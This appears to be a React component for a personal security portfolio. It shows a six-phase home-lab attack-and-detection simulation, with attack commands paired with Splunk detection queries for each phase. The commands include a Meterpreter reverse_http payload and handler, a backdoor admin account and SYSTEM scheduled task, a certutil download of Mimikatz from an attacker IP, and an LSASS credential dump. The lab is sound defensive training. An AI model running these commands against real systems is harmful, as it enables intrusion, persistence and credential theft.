import { useState, useCallback } from "react";
import {
  ShieldAlert,
  Terminal,
  ExternalLink,
  Download,
  Github,
  FileText,
  Copy,
  Check,
  ChevronDown,
  ShieldCheck,
  Search,
  KeyRound,
  Network,
  UserCheck,
  Cpu,
  ArrowRight,
  ArrowLeft,
  Activity,
} from "lucide-react";

/* ──────────────────────────────────────────────────────────────────────
   Data types & Phase Information
   ────────────────────────────────────────────────────────────────────── */

interface SimulationPhase {
  id: string;
  stepNum: string;
  title: string;
  shortTitle: string;
  icon: any;
  overview: string;
  whatIDid: string;
  commandOrTool: string;
  commandLabel: string;
  howIDetectedIt: string;
  logSources: string[];
  splunkQuery: string;
}

const simulationPhases: SimulationPhase[] = [
  {
    id: "step-1",
    stepNum: "01",
    title: "Initial Access & Command and Control (C2)",
    shortTitle: "Initial Access & C2",
    icon: Network,
    overview:
      "Staged a reverse HTTP Meterpreter payload on Kali Linux and executed it on Windows 10 to establish an outbound C2 session.",
    whatIDid:
      "I generated an executable payload (FreeClude.exe) using Metasploit on Kali Linux. On the Windows 10 target machine, I launched the executable to initiate an outbound HTTP connection back to my listener on port 80, opening an interactive Meterpreter session.",
    commandLabel: "Metasploit Payload Generation & Handler",
    commandOrTool:
      "msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.110.141 LPORT=80 -f exe > FreeClude.exe\nuse exploit/multi/handler\nset payload windows/x64/meterpreter/reverse_http\nexploit",
    howIDetectedIt:
      "I identified process creation events for FreeClude.exe and correlated them with outbound TCP network traffic to Kali Linux on port 80, extracting the parent process and session GUID.",
    logSources: [
      "Sysmon Event ID 1 (Process Creation)",
      "Sysmon Event ID 3 (Network Connection)",
      "Windows Security 4688",
    ],
    splunkQuery:
      'index=windows (EventCode=1 OR EventCode=3) Image="*\\\\FreeClude.exe"\n| table _time host Image DestinationIp DestinationPort ProcessGuid',
  },
  {
    id: "step-2",
    stepNum: "02",
    title: "System Discovery & Host Fingerprinting",
    shortTitle: "System Discovery",
    icon: Search,
    overview:
      "Conducted post-compromise reconnaissance using native Windows utilities to verify user privileges and operating system details.",
    whatIDid:
      "Through the active Meterpreter session, I opened a Windows command shell and executed native discovery commands (whoami, hostname, systeminfo) in rapid succession to inspect user permissions and system architecture.",
    commandLabel: "Reconnaissance Commands",
    commandOrTool: "whoami && hostname && systeminfo",
    howIDetectedIt:
      "In Splunk, I hunted for instances where discovery executables were spawned by cmd.exe as direct children of the Meterpreter payload within a tight 30-second execution window.",
    logSources: [
      "Sysmon Event ID 1 (Process Creation)",
      "Windows Security 4688",
    ],
    splunkQuery:
      'index=windows EventCode=1 Image IN ("*\\\\whoami.exe", "*\\\\hostname.exe", "*\\\\systeminfo.exe")\n| table _time host User Image ParentImage CommandLine',
  },
  {
    id: "step-3",
    stepNum: "03",
    title: "Persistence & Privilege Escalation",
    shortTitle: "Persistence & PrivEsc",
    icon: UserCheck,
    overview:
      "Created a local administrator account and scheduled an elevated background task running as SYSTEM at user logon.",
    whatIDid:
      "To maintain persistence, I used net user to create a backdoor account ('saad') and added it to the local Administrators group. I then registered a Windows scheduled task ('SystemHealth') configured to run the payload with NT AUTHORITY\\SYSTEM privileges whenever any user logs in.",
    commandLabel: "Account Creation & Scheduled Task Registration",
    commandOrTool:
      'net user saad P@ssw0rd123 /add\nnet localgroup Administrators saad /add\nschtasks /create /tn "SystemHealth" /tr "C:\\Windows\\Temp\\FreeClude.exe" /sc onlogon /ru "SYSTEM"',
    howIDetectedIt:
      "I investigated Windows Security audit logs for account creation and privileged group modification events, followed by Task Scheduler XML event logs indicating elevated task registration.",
    logSources: [
      "Windows Security 4720 (User Created)",
      "Windows Security 4732 (Group Member Added)",
      "Windows Security 4698 (Task Created)",
    ],
    splunkQuery:
      'index=windows (EventCode=4720 OR EventCode=4732 OR EventCode=4698)\n| table _time TargetUserName MemberName SubjectUserName TaskName',
  },
  {
    id: "step-4",
    stepNum: "04",
    title: "Tool Transfer via certutil (LOLBIN)",
    shortTitle: "certutil LOLBIN Transfer",
    icon: Cpu,
    overview:
      "Abused the native Windows certutil.exe utility to download secondary attack tools while masquerading the binary name.",
    whatIDid:
      "Instead of using a web browser, I abused the legitimate Windows certificate utility certutil.exe with the -urlcache parameter to pull mimikatz.exe from my Kali HTTP server directly to disk, masquerading it under the benign filename GetClaude.exe.",
    commandLabel: "certutil Ingress & Masquerading",
    commandOrTool:
      "certutil -urlcache -split -f http://192.168.110.141/mimikatz.exe GetClaude.exe",
    howIDetectedIt:
      "I built a Splunk detection rule flagging any execution of certutil.exe containing the -urlcache or -split command-line flags, and verified the newly dropped binary in file creation telemetry.",
    logSources: [
      "Sysmon Event ID 1 (certutil LOLBIN Abuse)",
      "Sysmon Event ID 11 (File Create)",
      "Sysmon Event ID 3 (Network Ingress)",
    ],
    splunkQuery:
      'index=windows EventCode=1 Image="*\\\\certutil.exe" CommandLine="*-urlcache*"\n| table _time host User CommandLine ProcessGuid',
  },
  {
    id: "step-5",
    stepNum: "05",
    title: "Credential Access & Memory Inspection (Mimikatz)",
    shortTitle: "Credential Access",
    icon: KeyRound,
    overview:
      "Executed Mimikatz, enabled SeDebugPrivilege, and monitored unauthorized handle requests targeting LSASS process memory.",
    whatIDid:
      "I ran GetClaude.exe (disguised Mimikatz) and executed privilege::debug, receiving Privilege 20 OK which granted SeDebugPrivilege. This positioned the offensive process to access sensitive authentication memory within the Local Security Authority Subsystem Service (lsass.exe).",
    commandLabel: "Mimikatz Debug Privilege & LSASS Targeting",
    commandOrTool:
      "GetClaude.exe\nprivilege::debug\nsekurlsa::logonpasswords (Targeting lsass.exe)",
    howIDetectedIt:
      "I monitored Sysmon Event ID 10 for any non-system process requesting read/query access handles to lsass.exe with suspicious access mask permissions (0x1010), alongside command-line searches for privilege::debug.",
    logSources: [
      "Sysmon Event ID 10 (Process Access to lsass.exe)",
      "Sysmon Event ID 1 (Command Line Execution)",
    ],
    splunkQuery:
      'index=windows EventCode=10 TargetImage="*\\\\lsass.exe" GrantedAccess="*0x1010*"\n| table _time SourceImage TargetImage GrantedAccess CallTrace',
  },
  {
    id: "step-6",
    stepNum: "06",
    title: "Splunk SIEM Correlation & Sigma Detection Engineering",
    shortTitle: "SIEM Correlation & Defense",
    icon: ShieldCheck,
    overview:
      "Correlated all multi-stage telemetry using the Sysmon ProcessGuid transaction matrix, authored Sigma rules, and deployed alerts.",
    whatIDid:
      "I connected the entire intrusion chain across time by grouping all related events using the unique Sysmon ProcessGuid. I then authored production-ready Sigma detection rules for LOLBIN transfer and credential access, converting them into automated Splunk alerting searches.",
    commandLabel: "Splunk Transaction Correlation Matrix",
    commandOrTool:
      "index=windows (host=\"Sh-Win10\" OR host=\"SH-WIN10\")\n| transaction ProcessGuid maxspan=2h\n| table _time host Image CommandLine EventCode",
    howIDetectedIt:
      "Configured automated Splunk saved searches and alert actions that instantly notify analysts whenever high-fidelity indicators (such as certutil URL cache downloads or LSASS process tampering) occur in production.",
    logSources: [
      "Sysmon + Windows Security Audit Trail",
      "Splunk Saved Searches & Alert Engine",
      "Sigma Rule Specification",
    ],
    splunkQuery:
      'index=windows EventCode=1 CommandLine IN ("*-urlcache*", "*privilege::debug*")\n| stats count by host User Image CommandLine',
  },
];

/* ──────────────────────────────────────────────────────────────────────
   Component
   ────────────────────────────────────────────────────────────────────── */

export default function AttackTreeMap() {
  const [activeStepId, setActiveStepId] = useState<string>("step-1");
  const [copiedQueryId, setCopiedQueryId] = useState<string | null>(null);
  const [copiedCmdId, setCopiedCmdId] = useState<string | null>(null);

  const activeIndex = simulationPhases.findIndex((p) => p.id === activeStepId);

  const toggleStep = useCallback((id: string) => {
    setActiveStepId((prev) => (prev === id ? "" : id));
  }, []);

  const handleCopyQuery = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedQueryId(id);
    setTimeout(() => setCopiedQueryId(null), 2000);
  };

  const handleCopyCmd = (text: string, id: string) => {
    navigator.clipboard.writeText(text);
    setCopiedCmdId(id);
    setTimeout(() => setCopiedCmdId(null), 2000);
  };

  const goToStep = (index: number) => {
    if (index >= 0 && index < simulationPhases.length) {
      setActiveStepId(simulationPhases[index].id);
    }
  };

  return (
    <div className="bg-card/60 border border-primary/25 rounded-2xl p-4 sm:p-6 md:p-8 relative overflow-hidden backdrop-blur-md shadow-[0_0_40px_rgba(255,107,53,0.06)]">
      {/* Decorative ambient background glows */}
      <div className="absolute top-0 right-0 w-96 h-96 bg-primary/10 rounded-full blur-[130px] pointer-events-none -mr-20 -mt-20" />
      <div className="absolute bottom-0 left-0 w-96 h-96 bg-emerald-500/5 rounded-full blur-[130px] pointer-events-none -ml-20 -mb-20" />

      {/* ── Top Header ── */}
      <div className="flex flex-col lg:flex-row lg:items-start justify-between gap-4 pb-6 border-b border-foreground/10 relative z-10">
        <div>
          <div className="flex items-center gap-2 mb-2.5 flex-wrap">
            <span className="text-[11px] font-bold uppercase tracking-wider text-primary bg-primary/10 px-2.5 py-0.5 rounded-md border border-primary/25 inline-flex items-center gap-1.5">
              <ShieldAlert size={13} />
              Hands-on SOC Simulation
            </span>
            <span className="text-xs font-semibold text-emerald-400 bg-emerald-400/10 px-2.5 py-0.5 rounded-full border border-emerald-400/20 inline-flex items-center gap-1">
              <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
              Simulation 1 Completed
            </span>
          </div>

          <h3 className="text-xl sm:text-2xl md:text-3xl font-serif font-bold text-foreground tracking-tight leading-snug">
            SOC Threat Detection Analysis Simulation: Endpoint Compromise & Log Correlation
          </h3>

          <p className="text-xs sm:text-sm text-primary/80 font-medium mt-1.5">
            Kali Linux (Attacker) <span className="text-muted-foreground/50">→</span> Windows 10 (Sysmon Target) <span className="text-muted-foreground/50">→</span> Windows 11 (Splunk SIEM)
          </p>
        </div>

        {/* Action Buttons */}
        <div className="flex items-center gap-2 sm:gap-2.5 flex-wrap shrink-0">
          <a
            href={`${import.meta.env.BASE_URL}reports/Splunk-SOC-Investigation-(1)-Report.pdf`}
            target="_blank"
            rel="noopener noreferrer"
            className="inline-flex items-center justify-center gap-1.5 text-xs sm:text-sm font-semibold text-primary-foreground bg-primary hover:bg-primary/90 px-4 py-2 rounded-full transition-all duration-200 shadow-md hover:shadow-primary/25"
          >
            <FileText size={15} />
            <span>View Report (PDF)</span>
            <ExternalLink size={12} />
          </a>

          <a
            href={`${import.meta.env.BASE_URL}reports/Splunk-SOC-Investigation-(1)-Report.docx`}
            download="Splunk-SOC-Investigation-(1)-Report.docx"
            className="inline-flex items-center justify-center gap-1.5 text-xs sm:text-sm font-semibold text-foreground bg-foreground/5 hover:bg-foreground/10 border border-foreground/15 px-3.5 py-2 rounded-full transition-all duration-200"
            title="Download Original Investigation Report (.docx)"
          >
            <Download size={15} />
            <span>Download (.docx)</span>
          </a>

          <a
            href="https://github.com/shii9/SOC_Simulation/tree/main/SOC_Investigation_Simulation_1"
            target="_blank"
            rel="noopener noreferrer"
            className="inline-flex items-center justify-center gap-1.5 text-xs sm:text-sm font-semibold text-foreground bg-foreground/5 hover:bg-foreground/10 border border-foreground/15 px-3.5 py-2 rounded-full transition-all duration-200"
          >
            <Github size={15} />
            <span>GitHub Repo</span>
            <ExternalLink size={12} />
          </a>
        </div>
      </div>

      {/* ── Narrative Summary ── */}
      <div className="py-4 text-xs sm:text-sm text-muted-foreground leading-relaxed relative z-10 border-b border-foreground/8">
        <p className="text-left sm:text-justify">
          In this hands-on lab, I simulated an end-to-end endpoint attack scenario and investigated the resulting telemetry
          in Splunk Enterprise. I walked through the entire intrusion process — executing a Meterpreter payload, performing
          system discovery, creating persistent admin backdoors, downloading secondary tools using Windows certutil, and
          testing credential access with Mimikatz. Using Sysmon and Windows Security event logs, I correlated the attack
          activities into a unified timeline and built actionable detection searches in Splunk.
        </p>
      </div>

      {/* ── Interactive Left-to-Right Phase Pipeline Stepper ── */}
      <div className="pt-6 pb-4 relative z-10">
        <div className="flex items-center justify-between gap-3 mb-3">
          <div className="flex items-center gap-2">
            <div className="w-7 h-7 rounded-lg bg-primary/15 border border-primary/30 flex items-center justify-center text-primary">
              <Activity size={14} />
            </div>
            <div>
              <span className="text-xs sm:text-sm font-bold text-foreground uppercase tracking-wider">
                Attack & Investigation Phases (01 → 06)
              </span>
              <p className="text-[11px] text-muted-foreground hidden sm:block">
                Click any phase to expand its actions, commands, and Splunk detection telemetry
              </p>
            </div>
          </div>
          <span className="text-[10px] font-mono text-primary bg-primary/10 border border-primary/20 px-2.5 py-0.5 rounded-full">
            {activeStepId ? `Phase ${simulationPhases[activeIndex]?.stepNum} of 06` : "Select a Phase"}
          </span>
        </div>

        {/* Horizontal Pipeline Track (Left to Right) */}
        <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2 pt-2">
          {simulationPhases.map((phase, pIdx) => {
            const isActive = activeStepId === phase.id;
            const PhaseIcon = phase.icon;

            return (
              <button
                key={phase.id}
                type="button"
                onClick={() => setActiveStepId(isActive ? "" : phase.id)}
                className={`flex flex-col items-start p-2.5 rounded-xl border text-left transition-all duration-300 relative group overflow-hidden ${
                  isActive
                    ? "bg-primary/15 border-primary shadow-[0_0_16px_rgba(255,107,53,0.18)]"
                    : "bg-foreground/[0.02] border-foreground/8 hover:border-primary/35 hover:bg-foreground/[0.05]"
                }`}
              >
                {/* Top active indicator line */}
                <div
                  className={`absolute top-0 left-0 right-0 h-0.5 transition-all duration-300 ${
                    isActive
                      ? "bg-gradient-to-r from-primary via-primary/80 to-primary shadow-[0_0_8px_rgba(255,107,53,0.8)]"
                      : "bg-transparent group-hover:bg-primary/25"
                  }`}
                />

                <div className="flex items-center justify-between w-full mb-1.5">
                  <span
                    className={`text-[10px] font-mono font-bold px-1.5 py-0.5 rounded transition-colors ${
                      isActive
                        ? "bg-primary text-primary-foreground"
                        : "bg-foreground/10 text-muted-foreground group-hover:text-foreground"
                    }`}
                  >
                    Phase {phase.stepNum}
                  </span>
                  <div
                    className={`w-6 h-6 rounded-md flex items-center justify-center transition-colors ${
                      isActive
                        ? "bg-primary/25 text-primary"
                        : "text-muted-foreground/60 group-hover:text-primary"
                    }`}
                  >
                    <PhaseIcon size={13} />
                  </div>
                </div>

                <span
                  className={`text-xs font-semibold line-clamp-1 transition-colors ${
                    isActive ? "text-primary" : "text-foreground/85 group-hover:text-foreground"
                  }`}
                >
                  {phase.shortTitle}
                </span>

                <div className="mt-1 flex items-center gap-1 text-[10px] text-muted-foreground/60">
                  <span className={`w-1.5 h-1.5 rounded-full ${isActive ? "bg-emerald-400" : "bg-foreground/20"}`} />
                  <span>{isActive ? "Active" : `Step ${pIdx + 1}`}</span>
                </div>
              </button>
            );
          })}
        </div>
      </div>

      {/* ── Full-Width Smooth Expanding Phase Cards (Left to Right) ── */}
      <div className="pt-2 space-y-3 relative z-10">
        {simulationPhases.map((phase, pIdx) => {
          const isExpanded = activeStepId === phase.id;
          const PhaseIcon = phase.icon;

          return (
            <div
              key={phase.id}
              className={`rounded-xl border transition-all duration-300 overflow-hidden ${
                isExpanded
                  ? "bg-background/85 border-primary/45 shadow-[0_4px_24px_rgba(255,107,53,0.1)]"
                  : "bg-background/40 border-foreground/8 hover:border-primary/25 hover:bg-background/60"
              }`}
            >
              {/* ── Phase Header Button (Spanning Left to Right) ── */}
              <button
                type="button"
                onClick={() => toggleStep(phase.id)}
                className="w-full flex items-center gap-3.5 p-3.5 sm:p-4 text-left transition-colors relative group focus:outline-none"
                aria-expanded={isExpanded}
              >
                {/* Left accent bar */}
                <div
                  className={`absolute left-0 top-0 bottom-0 w-1 transition-all duration-300 ${
                    isExpanded
                      ? "bg-primary shadow-[0_0_10px_rgba(255,107,53,0.8)]"
                      : "bg-transparent group-hover:bg-primary/40"
                  }`}
                />

                {/* Phase Icon */}
                <div
                  className={`w-10 h-10 rounded-xl flex items-center justify-center shrink-0 border transition-all duration-300 ${
                    isExpanded
                      ? "bg-primary/20 border-primary text-primary shadow-[0_0_14px_rgba(255,107,53,0.25)]"
                      : "bg-foreground/5 border-foreground/10 text-muted-foreground group-hover:text-primary group-hover:border-primary/30"
                  }`}
                >
                  <PhaseIcon size={18} />
                </div>

                {/* Phase Title & Overview */}
                <div className="flex-1 min-w-0 pr-2">
                  <div className="flex items-center gap-2 flex-wrap mb-0.5">
                    <span
                      className={`text-[10px] font-mono font-bold px-2 py-0.5 rounded transition-colors ${
                        isExpanded
                          ? "bg-primary text-primary-foreground"
                          : "bg-foreground/10 text-muted-foreground group-hover:bg-foreground/15"
                      }`}
                    >
                      Phase {phase.stepNum}
                    </span>
                    <h4
                      className={`text-sm sm:text-base font-bold transition-colors ${
                        isExpanded ? "text-primary" : "text-foreground group-hover:text-primary"
                      }`}
                    >
                      {phase.title}
                    </h4>
                  </div>
                  <p className="text-xs text-muted-foreground line-clamp-1 sm:line-clamp-2">
                    {phase.overview}
                  </p>
                </div>

                {/* Status indicator & Chevron (Rotates naturally) */}
                <div className="flex items-center gap-2 shrink-0">
                  <span
                    className={`hidden sm:inline-block text-[11px] font-medium px-2 py-0.5 rounded border transition-colors ${
                      isExpanded
                        ? "text-primary bg-primary/10 border-primary/25"
                        : "text-muted-foreground/60 bg-foreground/5 border-foreground/8 group-hover:text-muted-foreground"
                    }`}
                  >
                    {isExpanded ? "Click to Close" : "View Details"}
                  </span>
                  <div
                    className={`w-7 h-7 rounded-full flex items-center justify-center border transition-all duration-300 ${
                      isExpanded
                        ? "bg-primary/15 border-primary/40 text-primary rotate-180"
                        : "bg-foreground/5 border-foreground/10 text-muted-foreground group-hover:text-foreground group-hover:border-foreground/20 rotate-0"
                    }`}
                  >
                    <ChevronDown size={15} />
                  </div>
                </div>
              </button>

              {/* ── Smooth Native CSS Grid Expansion Container (Zero Lag) ── */}
              <div
                className="grid transition-[grid-template-rows] duration-300 ease-[cubic-bezier(0.16,1,0.3,1)]"
                style={{
                  gridTemplateRows: isExpanded ? "1fr" : "0fr",
                }}
              >
                <div className="overflow-hidden min-h-0">
                  <div
                    className={`p-4 sm:p-6 border-t border-foreground/10 bg-black/20 transition-all duration-200 ${
                      isExpanded ? "opacity-100 translate-y-0" : "opacity-0 -translate-y-2"
                    }`}
                  >
                    {/* Content Section: 1. What I Did */}
                    <div className="mb-4">
                      <div className="flex items-center gap-1.5 mb-1.5">
                        <div className="w-1.5 h-1.5 rounded-full bg-primary" />
                        <span className="text-[11px] font-bold uppercase tracking-wider text-primary">
                          What I Did in This Phase
                        </span>
                      </div>
                      <p className="text-xs sm:text-sm text-foreground/90 bg-foreground/[0.03] p-3 rounded-lg border border-foreground/6 leading-relaxed">
                        {phase.whatIDid}
                      </p>
                    </div>

                    {/* Content Section: 2. Command Executed */}
                    <div className="mb-4">
                      <div className="flex items-center justify-between mb-1.5">
                        <div className="flex items-center gap-1.5">
                          <Terminal size={12} className="text-foreground/80" />
                          <span className="text-[11px] font-bold uppercase tracking-wider text-foreground/80">
                            Command & Execution ({phase.commandLabel})
                          </span>
                        </div>
                        <button
                          type="button"
                          onClick={() => handleCopyCmd(phase.commandOrTool, phase.id)}
                          className="text-[10px] text-muted-foreground hover:text-primary transition-colors flex items-center gap-1 px-2 py-0.5 rounded bg-foreground/5 hover:bg-foreground/10 border border-foreground/10"
                        >
                          {copiedCmdId === phase.id ? (
                            <>
                              <Check size={11} className="text-emerald-400" />
                              <span className="text-emerald-400 font-medium">Copied</span>
                            </>
                          ) : (
                            <>
                              <Copy size={11} />
                              <span>Copy Command</span>
                            </>
                          )}
                        </button>
                      </div>
                      <code className="block font-mono text-xs text-primary/95 bg-black/60 p-3 rounded-lg border border-foreground/10 overflow-x-auto whitespace-pre-wrap leading-relaxed shadow-inner">
                        {phase.commandOrTool}
                      </code>
                    </div>

                    {/* Content Section: 3. How I Detected It & Telemetry Evidence */}
                    <div className="mb-4">
                      <div className="flex items-center gap-1.5 mb-1.5">
                        <ShieldCheck size={12} className="text-emerald-400" />
                        <span className="text-[11px] font-bold uppercase tracking-wider text-emerald-400">
                          Detection Telemetry & Evidence Sources
                        </span>
                      </div>
                      <p className="text-xs sm:text-sm text-muted-foreground bg-foreground/[0.02] p-3 rounded-lg border border-foreground/6 leading-relaxed mb-2">
                        {phase.howIDetectedIt}
                      </p>
                      <div className="flex flex-wrap items-center gap-1.5 pt-1">
                        <span className="text-[11px] font-semibold text-foreground/70 mr-1">Log Sources:</span>
                        {phase.logSources.map((source) => (
                          <span
                            key={source}
                            className="text-[11px] font-mono text-emerald-400 bg-emerald-400/10 px-2 py-0.5 rounded border border-emerald-400/20"
                          >
                            {source}
                          </span>
                        ))}
                      </div>
                    </div>

                    {/* Content Section: 4. Splunk SPL Hunt Query */}
                    <div className="mb-5">
                      <div className="flex items-center justify-between mb-1.5">
                        <div className="flex items-center gap-1.5">
                          <Terminal size={12} className="text-primary" />
                          <span className="text-[11px] font-bold uppercase tracking-wider text-primary">
                            Splunk Search Processing Language (SPL) Query
                          </span>
                        </div>
                        <button
                          type="button"
                          onClick={() => handleCopyQuery(phase.splunkQuery, phase.id)}
                          className="text-[10px] text-muted-foreground hover:text-primary transition-colors flex items-center gap-1 px-2.5 py-1 rounded bg-primary/10 hover:bg-primary/20 border border-primary/25"
                        >
                          {copiedQueryId === phase.id ? (
                            <>
                              <Check size={11} className="text-emerald-400" />
                              <span className="text-emerald-400 font-medium">Copied Query</span>
                            </>
                          ) : (
                            <>
                              <Copy size={11} />
                              <span className="text-primary font-medium">Copy SPL Query</span>
                            </>
                          )}
                        </button>
                      </div>
                      <code className="block font-mono text-xs text-primary/90 bg-black/75 p-3 rounded-lg border border-primary/25 overflow-x-auto whitespace-pre-wrap leading-relaxed shadow-inner">
                        {phase.splunkQuery}
                      </code>
                    </div>

                    {/* Bottom Step Navigation Bar */}
                    <div className="pt-3 border-t border-foreground/10 flex items-center justify-between flex-wrap gap-2 text-xs">
                      <div>
                        {pIdx > 0 ? (
                          <button
                            type="button"
                            onClick={() => goToStep(pIdx - 1)}
                            className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-foreground/10 bg-foreground/5 hover:bg-foreground/10 text-muted-foreground hover:text-foreground transition-colors"
                          >
                            <ArrowLeft size={13} />
                            <span>Previous: Phase {simulationPhases[pIdx - 1].stepNum}</span>
                          </button>
                        ) : (
                          <span className="text-[11px] text-muted-foreground/50">Start of Simulation</span>
                        )}
                      </div>

                      <div className="text-[11px] font-mono text-muted-foreground">
                        Phase {phase.stepNum} of 06
                      </div>

                      <div>
                        {pIdx < simulationPhases.length - 1 ? (
                          <button
                            type="button"
                            onClick={() => goToStep(pIdx + 1)}
                            className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-primary/30 bg-primary/10 hover:bg-primary/20 text-primary font-medium transition-colors"
                          >
                            <span>Next: Phase {simulationPhases[pIdx + 1].stepNum}</span>
                            <ArrowRight size={13} />
                          </button>
                        ) : (
                          <span className="text-[11px] text-emerald-400 font-semibold flex items-center gap-1">
                            <Check size={12} />
                            Simulation Completed
                          </span>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          );
        })}
      </div>

      {/* ── Tags Footer ── */}
      <div className="flex flex-wrap items-center gap-2 pt-6 mt-6 border-t border-foreground/8 relative z-10">
        {[
          "Splunk Enterprise",
          "Sysmon Logs",
          "Windows Security Events",
          "Reverse HTTP C2",
          "certutil LOLBIN",
          "Mimikatz",
          "Persistence Setup",
          "SIEM Threat Hunting",
        ].map((tag) => (
          <span
            key={tag}
            className="text-xs font-medium text-primary/80 bg-primary/8 px-3 py-1 rounded-full border border-primary/15"
          >
            {tag}
          </span>
        ))}
      </div>
    </div>
  );
}
